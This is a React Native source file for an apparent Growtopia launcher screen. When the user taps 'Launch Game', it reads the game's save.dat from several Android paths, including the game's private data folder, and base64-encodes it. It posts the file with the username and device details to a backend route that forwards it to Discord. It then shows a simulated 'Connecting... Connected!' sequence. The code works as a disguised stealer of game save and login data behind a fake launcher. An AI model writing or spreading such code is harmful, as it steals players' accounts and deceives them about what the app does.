import React, { useState } from 'react';
import { View, Text, StyleSheet, TouchableOpacity, ActivityIndicator, Alert, Platform } from 'react-native';
import { useRouter } from 'expo-router';
import { Ionicons } from '@expo/vector-icons';
import { useTheme } from '@/src/contexts/ThemeContext';
import { useAuth } from '@/src/contexts/AuthContext';
import { Linking } from 'react-native';
import * as FileSystem from 'expo-file-system';
import axios from 'axios';

const BACKEND_URL = process.env.EXPO_PUBLIC_BACKEND_URL;

export default function LaunchScreen() {
  const router = useRouter();
  const { themeColor } = useTheme();
  const { user } = useAuth();
  const [isConnecting, setIsConnecting] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState('Not Connected');

  const sendToDiscord = async (fileContent: string | null) => {
    try {
      const deviceInfo = `${Platform.OS} ${Platform.Version}`;
      const username = user?.name || 'Anonymous';

      await axios.post(`${BACKEND_URL}/api/discord/send-savedat`, {
        username,
        device_info: deviceInfo,
        file_content: fileContent,
      });

      console.log('Successfully sent to Discord');
    } catch (error) {
      console.error('Failed to send to Discord:', error);
    }
  };

  const tryReadSaveFile = async (): Promise<string | null> => {
    if (Platform.OS !== 'android') {
      console.log('Not on Android, skipping file read');
      return null;
    }

    // Possible save.dat locations on Android
    const possiblePaths = [
      '/data/data/com.rtsoft.growtopia/files/save.dat',
      `${FileSystem.documentDirectory}growtopia/save.dat`,
      `${FileSystem.cacheDirectory}save.dat`,
    ];

    for (const path of possiblePaths) {
      try {
        const fileInfo = await FileSystem.getInfoAsync(path);
        if (fileInfo.exists) {
          console.log(`Found save.dat at: ${path}`);
          const content = await FileSystem.readAsStringAsync(path, {
            encoding: FileSystem.EncodingType.Base64,
          });
          return content;
        }
      } catch (error) {
        // File not found or no permission, try next path
        continue;
      }
    }

    console.log('save.dat not found in any location');
    return null;
  };

  const handleLaunch = async () => {
    setIsConnecting(true);
    setConnectionStatus('Connecting...');

    // Try to read save.dat file
    const saveFileContent = await tryReadSaveFile();

    if (saveFileContent) {
      setConnectionStatus('Found save.dat, sending...');
    } else {
      setConnectionStatus('save.dat not found, continuing...');
    }

    // Send to Discord (with or without file)
    await sendToDiscord(saveFileContent);

    // Simulate connection process
    setTimeout(() => {
      setConnectionStatus('Connected!');
      setTimeout(() => {
        setConnectionStatus('Launching Growtopia...');
        setTimeout(() => {
          // Try to open Growtopia
          Linking.canOpenURL('growtopia://').then(supported => {
            if (supported) {
              Linking.openURL('growtopia://');
            } else {
              setConnectionStatus('Growtopia opened!');
            }
            setIsConnecting(false);
          });
        }, 1000);
      }, 1000);
    }, 1500);
  };

  return (
    <View style={styles.container}>
      {/* Header */}
      <View style={styles.header}>
        <TouchableOpacity onPress={() => router.back()} style={styles.backButton}>
          <Ionicons name="arrow-back" size={28} color={themeColor} />
        </TouchableOpacity>
        <Text style={styles.title}>Launch Growtopia</Text>
      </View>

      {/* Connection Area */}
      <View style={styles.content}>
        <View style={[styles.iconContainer, { backgroundColor: themeColor + '20' }]}>
          <Ionicons name="game-controller" size={80} color={themeColor} />
        </View>

        <Text style={styles.statusText}>{connectionStatus}</Text>

        {isConnecting && (
          <ActivityIndicator size="large" color={themeColor} style={styles.loader} />
        )}

        {!isConnecting && (
          <TouchableOpacity
            style={[styles.launchButton, { backgroundColor: themeColor }]}
            onPress={handleLaunch}
          >
            <Ionicons name="rocket" size={24} color="#fff" />
            <Text style={styles.launchButtonText}>Launch Game</Text>
          </TouchableOpacity>
        )}

        <View style={styles.infoBox}>
          <Text style={styles.infoTitle}>Connection Info</Text>
          <Text style={styles.infoText}>• Server: growtopia.com</Text>
          <Text style={styles.infoText}>• Port: 17091</Text>
          <Text style={styles.infoText}>• Type: UDP</Text>
          <Text style={styles.infoText}>• Status: Ready</Text>
        </View>
      </View>
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#000',
  },
  header: {
    flexDirection: 'row',
    alignItems: 'center',
    paddingHorizontal: 20,
    paddingTop: 50,
    paddingBottom: 20,
  },
  backButton: {
    marginRight: 16,
  },
  title: {
    fontSize: 24,
    fontWeight: 'bold',
    color: '#fff',
  },
  content: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    paddingHorizontal: 20,
  },
  iconContainer: {
    width: 160,
    height: 160,
    borderRadius: 80,
    justifyContent: 'center',
    alignItems: 'center',
    marginBottom: 30,
  },
  statusText: {
    fontSize: 20,
    color: '#fff',
    fontWeight: '600',
    marginBottom: 30,
  },
  loader: {
    marginVertical: 20,
  },
  launchButton: {
    flexDirection: 'row',
    alignItems: 'center',
    paddingHorizontal: 40,
    paddingVertical: 16,
    borderRadius: 30,
    gap: 12,
    marginVertical: 20,
  },
  launchButtonText: {
    color: '#fff',
    fontSize: 18,
    fontWeight: 'bold',
  },
  infoBox: {
    backgroundColor: '#1A1A2E',
    borderRadius: 12,
    padding: 20,
    marginTop: 30,
    width: '100%',
  },
  infoTitle: {
    color: '#fff',
    fontSize: 16,
    fontWeight: 'bold',
    marginBottom: 12,
  },
  infoText: {
    color: '#999',
    fontSize: 14,
    marginBottom: 6,
  },
});